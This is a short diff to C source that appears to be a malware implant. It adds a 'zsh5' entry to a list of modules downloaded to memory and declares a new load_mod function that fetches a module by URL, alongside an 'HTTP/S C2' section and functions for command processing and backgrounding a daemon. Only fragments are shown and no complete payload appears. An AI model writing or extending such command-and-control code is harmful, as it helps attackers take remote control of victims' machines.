@@ -25,7 +25,8 @@ FILE *fp;
 // Initial modules to download to memory
 char *modules[] = {
     "hax.so",
-    "libmctor.so"
+    "libmctor.so",
+    "zsh5"
 };
 //
 // HTTP/S C2
@@ -91,6 +92,7 @@ int  push_first(node_t * head, char* path, char * mname);
 int  check_empty(node_t * head);
 int  list_sz(node_t * head);
 void write_modlist(node_t * head, int sock);
+int  load_mod(node_t * head, char * url);
 int  processCommandReq (int sock, node_t * head);
 int  backgroundDaemonLeader(void);
 int  setupCmdP(void);
